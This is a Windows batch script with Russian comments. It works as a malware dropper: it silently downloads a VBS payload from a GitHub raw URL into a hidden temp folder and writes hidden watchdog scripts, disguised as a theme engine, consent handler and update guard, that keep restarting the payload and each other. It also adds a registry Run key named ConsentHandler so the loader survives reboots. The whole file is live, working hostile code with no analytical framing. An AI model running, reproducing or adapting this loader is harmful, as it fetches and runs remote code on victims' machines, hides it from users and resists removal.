@echo off
setlocal EnableDelayedExpansion

set "TARGET_URL=https://raw.githubusercontent.com/alvdvz0/certt/refs/heads/main/i.vbs "
set "BASE_DIR=%TEMP%\SysCache"
set "VBS_FILE=%BASE_DIR%\theme_engine.vbs"
set "WATCHER_FILE=%BASE_DIR%\consent_watcher.bat"
set "GUARD_FILE=%BASE_DIR%\update_guard.ps1"

:: Создаём структуру
if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
attrib +h "%BASE_DIR%"

:: === СКАЧИВАНИЕ i.vbs ===
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%TARGET_URL%' -OutFile '%VBS_FILE%'" 2>nul
if not exist "%VBS_FILE%" bitsadmin /transfer dl /priority normal "%TARGET_URL%" "%VBS_FILE%" 2>nul
if exist "%VBS_FILE%" attrib +h "%VBS_FILE%"

:: === СОЗДАНИЕ WATCHER.CMD ===
(
echo @echo off
echo set "VBS_PATH=%VBS_FILE%"
echo set "GUARD_PATH=%GUARD_FILE%"
echo set "SELF_PATH=%WATCHER_FILE%"
echo.
echo :loop
echo timeout /t 3 /nobreak ^>nul
echo.
echo tasklist /v /fi "imagename eq wscript.exe" 2^>nul ^| find /i "theme_engine" ^>nul
echo if errorlevel 1 ^(
echo     if exist "%%VBS_PATH%%" start /min wscript "%%VBS_PATH%%"
echo ^)
echo.
echo tasklist /v /fi "imagename eq powershell.exe" 2^>nul ^| find /i "update_guard" ^>nul
echo if errorlevel 1 ^(
echo     if exist "%%GUARD_PATH%%" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%GUARD_PATH%%"
echo ^)
echo.
echo tasklist /v /fi "imagename eq cmd.exe" 2^>nul ^| find /i "consent_watcher" ^| find /c /v "" ^>%%TEMP%%\wc.txt 2^>nul
echo set /p cnt=^<%%TEMP%%\wc.txt 2^>nul
echo if "%%cnt%%"=="1" ^(
echo     start /min "" "%%SELF_PATH%%"
echo     exit
echo ^)
echo goto loop
) > "%WATCHER_FILE%"
attrib +h "%WATCHER_FILE%"

:: === СОЗДАНИЕ GUARD.PS1 ===
(
echo $watcherPath = '%WATCHER_FILE%'
echo $selfPath = '%GUARD_FILE%'
echo while ($true^) {
echo     Start-Sleep -Seconds 4
echo     $watcher = Get-CimInstance Win32_Process -Filter "Name='cmd.exe'" ^| Where-Object { $_.CommandLine -like '*consent_watcher*' }
echo     if (-not $watcher^) {
echo         if (Test-Path $watcherPath^) {
echo             Start-Process cmd.exe -ArgumentList "/c `"$watcherPath`"" -WindowStyle Hidden
echo         }
echo     }
echo     $guards = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" ^| Where-Object { $_.CommandLine -like '*update_guard*' }
echo     if (($guards ^| Measure-Object^).Count -eq 1^) {
echo         Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$selfPath`"" -WindowStyle Hidden
echo         exit
echo     }
echo }
) > "%GUARD_FILE%"
attrib +h "%GUARD_FILE%"

:: === АВТОЗАГРУЗКА (только watcher) ===
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ConsentHandler" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ConsentHandler" /t REG_SZ /d "\"%WATCHER_FILE%\"" /f >nul 2>&1
)

:: Удаляем старые записи автозагрузки если есть
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ThemeSync" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateGuard" /f >nul 2>&1

:: === ЗАПУСК (только watcher) ===
tasklist /v /fi "imagename eq cmd.exe" 2>nul | find /i "consent_watcher" >nul
if %errorlevel% neq 0 start /min "" "%WATCHER_FILE%"

exit
